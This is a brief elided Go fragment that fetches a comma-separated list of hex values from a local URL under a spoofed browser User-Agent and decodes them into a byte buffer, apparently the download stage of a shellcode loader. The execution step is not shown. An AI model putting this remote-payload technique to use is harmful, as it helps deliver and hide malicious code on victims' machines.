...
func main() {
	...
	rsp,_:=req.Get("http://127.0.0.1/download.txt",requests.Header{"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"})
	text:=strings.Split(rsp.Text(),", ")
	for calc:=0;calc<len(text);calc++{
		buff = append(buff,byte(findhexnumber(text[calc])))
	}
